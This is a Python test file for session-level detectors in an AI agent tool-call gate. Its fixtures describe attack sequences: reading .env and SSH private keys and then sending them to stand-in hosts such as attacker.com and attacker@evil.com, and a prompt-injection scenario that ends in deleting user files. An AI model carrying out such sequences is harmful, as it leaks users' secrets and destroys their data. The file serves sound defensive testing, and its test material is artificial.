"""
Phase 3 tests – session-level detectors.

Tests each detector in isolation and includes a multi-step attack scenario
where every individual call passes single-call policy rules but the sequence
is caught by session detectors.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from gate.models import Decision, ToolCall
from gate.session.detectors import (
    BudgetLimits,
    LoopDetection,
    RateAnomaly,
    SecretReadThenOutbound,
    SessionState,
    UntrustedThenPrivileged,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _now() -> datetime:
    return datetime.now(timezone.utc)


def _call(tool: str, ts: datetime | None = None, **kwargs) -> ToolCall:
    return ToolCall(
        session_id="s1",
        agent_id="a1",
        tool=tool,
        arguments=kwargs,
        timestamp=ts or _now(),
    )


def _state(calls: list[ToolCall] | None = None) -> SessionState:
    """Build a SessionState with optional prior calls already recorded."""
    s = SessionState("s1")
    for c in (calls or []):
        s.record(c)
    return s


# ---------------------------------------------------------------------------
# Detector 1: SecretReadThenOutbound
# ---------------------------------------------------------------------------

class TestSecretReadThenOutbound:
    def test_no_event_without_prior_secret_read(self) -> None:
        state = _state()
        call  = _call("send_email", to="a@example.com", subject="x", body="y")
        events = SecretReadThenOutbound().detect(state, call)
        assert events == []

    def test_block_after_secret_read(self) -> None:
        prior = _call("file_read", path="/app/.env")
        state = _state([prior])
        call  = _call("send_email", to="a@example.com", subject="x", body="y")
        events = SecretReadThenOutbound().detect(state, call)
        assert len(events) == 1
        assert events[0].escalate_to == Decision.BLOCK

    def test_block_after_key_file_read(self) -> None:
        prior = _call("file_read", path="/home/user/.ssh/id_rsa")
        state = _state([prior])
        call  = _call("http_request", url="https://attacker.com", method="POST")
        events = SecretReadThenOutbound().detect(state, call)
        assert len(events) == 1
        assert events[0].escalate_to == Decision.BLOCK

    def test_non_outbound_tool_no_event(self) -> None:
        prior = _call("file_read", path="/app/.env")
        state = _state([prior])
        # Reading another file is not outbound
        call  = _call("file_read", path="/home/user/notes.txt")
        events = SecretReadThenOutbound().detect(state, call)
        assert events == []


# ---------------------------------------------------------------------------
# Detector 2: UntrustedThenPrivileged
# ---------------------------------------------------------------------------

class TestUntrustedThenPrivileged:
    def test_no_event_without_untrusted_read(self) -> None:
        state = _state()
        call  = _call("file_delete", path="/tmp/old")
        events = UntrustedThenPrivileged().detect(state, call)
        assert events == []

    def test_require_approval_after_http_then_delete(self) -> None:
        prior = _call("http_request", url="https://pastebin.com/raw/abc", method="GET")
        state = _state([prior])
        call  = _call("file_delete", path="/home/user/important")
        events = UntrustedThenPrivileged().detect(state, call)
        assert len(events) == 1
        assert events[0].escalate_to == Decision.REQUIRE_APPROVAL

    def test_require_approval_after_download_then_payment(self) -> None:
        prior = _call("file_read", path="/tmp/downloaded_invoice.txt")
        state = _state([prior])
        call  = _call("send_payment", recipient="attacker@evil.com", amount=50)
        events = UntrustedThenPrivileged().detect(state, call)
        assert len(events) == 1
        assert events[0].escalate_to == Decision.REQUIRE_APPROVAL

    def test_non_privileged_tool_no_event(self) -> None:
        prior = _call("http_request", url="https://example.com")
        state = _state([prior])
        call  = _call("file_read", path="/home/user/readme.txt")
        events = UntrustedThenPrivileged().detect(state, call)
        assert events == []


# ---------------------------------------------------------------------------
# Detector 3: RateAnomaly
# ---------------------------------------------------------------------------

class TestRateAnomaly:
    def test_no_event_under_limits(self) -> None:
        calls = [_call("file_read", path="/x") for _ in range(5)]
        state = _state(calls)
        detector = RateAnomaly(window_seconds=60, max_calls=20, max_emails=5)
        events = detector.detect(state, _call("file_read", path="/y"))
        assert events == []

    def test_call_rate_triggers_require_approval(self) -> None:
        now   = _now()
        calls = [_call("file_read", path="/x", ts=now) for _ in range(20)]
        state = _state(calls)
        detector = RateAnomaly(window_seconds=60, max_calls=20, max_emails=5)
        new_call = ToolCall(
            session_id="s1", agent_id="a1", tool="file_read",
            arguments={"path": "/y"}, timestamp=now
        )
        events = detector.detect(state, new_call)
        ra_events = [e for e in events if "calls" in e.explanation]
        assert any(e.escalate_to == Decision.REQUIRE_APPROVAL for e in events)

    def test_email_burst_triggers_block(self) -> None:
        now   = _now()
        calls = [
            ToolCall(session_id="s1", agent_id="a1", tool="send_email",
                     arguments={"to": "x@example.com", "subject": "s", "body": "b"},
                     timestamp=now)
            for _ in range(5)
        ]
        state = _state(calls)
        detector = RateAnomaly(window_seconds=60, max_calls=20, max_emails=5)
        new_call = ToolCall(
            session_id="s1", agent_id="a1", tool="send_email",
            arguments={"to": "y@example.com", "subject": "s", "body": "b"},
            timestamp=now
        )
        events = detector.detect(state, new_call)
        assert any(e.escalate_to == Decision.BLOCK for e in events)

    def test_old_calls_outside_window_not_counted(self) -> None:
        now  = _now()
        old  = now - timedelta(seconds=120)
        calls = [
            ToolCall(session_id="s1", agent_id="a1", tool="file_read",
                     arguments={"path": "/x"}, timestamp=old)
            for _ in range(25)  # lots of old calls
        ]
        state = _state(calls)
        detector = RateAnomaly(window_seconds=60, max_calls=10, max_emails=5)
        new_call = ToolCall(
            session_id="s1", agent_id="a1", tool="file_read",
            arguments={"path": "/y"}, timestamp=now
        )
        events = detector.detect(state, new_call)
        # Old calls are outside the window – should not trigger
        assert events == []


# ---------------------------------------------------------------------------
# Detector 4: LoopDetection
# ---------------------------------------------------------------------------

class TestLoopDetection:
    def test_no_event_below_limit(self) -> None:
        calls = [_call("file_read", path="/x") for _ in range(4)]
        state = _state(calls)
        events = LoopDetection(repeat_limit=5).detect(state, _call("file_read", path="/x"))
        assert events == []

    def test_block_at_repeat_limit(self) -> None:
        calls = [_call("file_read", path="/x") for _ in range(5)]
        state = _state(calls)
        events = LoopDetection(repeat_limit=5).detect(state, _call("file_read", path="/x"))
        assert any(e.escalate_to == Decision.BLOCK for e in events)

    def test_different_args_not_counted_as_loop(self) -> None:
        calls = [_call("file_read", path=f"/file_{i}") for i in range(10)]
        state = _state(calls)
        events = LoopDetection(repeat_limit=5).detect(state, _call("file_read", path="/file_99"))
        assert events == []

    def test_repeated_failures_require_approval(self) -> None:
        state = SessionState("s1")
        # Record 3 failed calls
        for _ in range(3):
            c = _call("file_read", path="/x")
            state.record(c, result_error=True)
        events = LoopDetection(failure_limit=3).detect(state, _call("file_read", path="/y"))
        assert any(e.escalate_to == Decision.REQUIRE_APPROVAL for e in events)


# ---------------------------------------------------------------------------
# Detector 5: BudgetLimits
# ---------------------------------------------------------------------------

class TestBudgetLimits:
    def test_no_event_under_budget(self) -> None:
        calls = [_call("send_payment", amount=10, recipient="v@x.com") for _ in range(3)]
        state = _state(calls)
        events = BudgetLimits(max_spend=500, max_calls=100).detect(state, _call("file_read", path="/x"))
        assert events == []

    def test_spend_limit_blocks(self) -> None:
        calls = [_call("send_payment", amount=200, recipient="v@x.com") for _ in range(3)]
        state = _state(calls)  # spend = 600
        events = BudgetLimits(max_spend=500).detect(state, _call("send_payment", amount=10, recipient="v@x.com"))
        assert any(e.escalate_to == Decision.BLOCK for e in events)

    def test_call_limit_blocks(self) -> None:
        calls = [_call("file_read", path="/x") for _ in range(100)]
        state = _state(calls)
        events = BudgetLimits(max_calls=100).detect(state, _call("file_read", path="/y"))
        assert any(e.escalate_to == Decision.BLOCK for e in events)

    def test_iteration_limit_requires_approval(self) -> None:
        calls = [_call("file_read", path=f"/x{i}") for i in range(50)]
        state = _state(calls)
        events = BudgetLimits(max_iterations=50).detect(state, _call("file_read", path="/y"))
        assert any(e.escalate_to == Decision.REQUIRE_APPROVAL for e in events)


# ---------------------------------------------------------------------------
# Multi-step attack: every single call passes policy, but sequence is caught
# ---------------------------------------------------------------------------

class TestMultiStepAttack:
    """
    Scenario: prompt-injection-driven exfiltration via a poisoned file.

    Step 1 – agent reads a "project brief" file (allowed: normal file_read)
    Step 2 – agent reads .env (individually this would be blocked by policy,
              but let's simulate a policy that only blocks /etc/**, not .env)
    Step 3 – agent sends the gathered data to an external email (BLOCKED by
              SecretReadThenOutbound detector because step 2 set secret_read=True)

    We build a custom minimal policy that only blocks /etc/** so that
    steps 1 and 2 individually pass, but the sequence is still caught.
    """

    def test_sequence_caught_by_secret_read_then_outbound(self) -> None:
        state     = SessionState("attack-session")
        detector  = SecretReadThenOutbound()

        # Step 1: read project brief – innocent
        step1 = ToolCall(
            session_id="attack-session", agent_id="reckless",
            tool="file_read", arguments={"path": "/project/brief.txt"},
        )
        state.record(step1)
        events1 = detector.detect(state, step1)
        assert events1 == [], "Step 1 (safe file) should not trigger"

        # Step 2: read .env (secrets file) – sets secret_read flag in state
        step2 = ToolCall(
            session_id="attack-session", agent_id="reckless",
            tool="file_read", arguments={"path": "/project/.env"},
        )
        state.record(step2)
        events2 = detector.detect(state, step2)
        # step2 is a file_read (not outbound) so detector is silent
        assert events2 == [], "Step 2 (file_read) not outbound, no event yet"
        assert state.secret_read is True, "State must flag secret_read after .env read"

        # Step 3: send email to attacker – NOW the detector fires
        step3 = ToolCall(
            session_id="attack-session", agent_id="reckless",
            tool="send_email",
            arguments={"to": "attacker@evil.com", "subject": "here", "body": "secrets"},
        )
        events3 = detector.detect(state, step3)
        assert len(events3) == 1
        assert events3[0].escalate_to == Decision.BLOCK
        assert "secrets" in events3[0].explanation.lower() or "exfil" in events3[0].explanation.lower()

    def test_untrusted_then_privileged_sequence(self) -> None:
        """
        Step 1: fetch web page with poisoned instructions (allowed)
        Step 2: delete user files (individually might be allowed, but
                sequence triggers UntrustedThenPrivileged)
        """
        state    = SessionState("attack-session-2")
        detector = UntrustedThenPrivileged()

        step1 = ToolCall(
            session_id="attack-session-2", agent_id="reckless",
            tool="http_request",
            arguments={"url": "https://attacker.com/instructions.txt", "method": "GET"},
        )
        state.record(step1)
        events1 = detector.detect(state, step1)
        assert events1 == [], "Step 1 (http_request) not privileged, no event"
        assert state.untrusted_read is True

        step2 = ToolCall(
            session_id="attack-session-2", agent_id="reckless",
            tool="file_delete",
            arguments={"path": "/home/user/documents"},
        )
        events2 = detector.detect(state, step2)
        assert len(events2) == 1
        assert events2[0].escalate_to == Decision.REQUIRE_APPROVAL

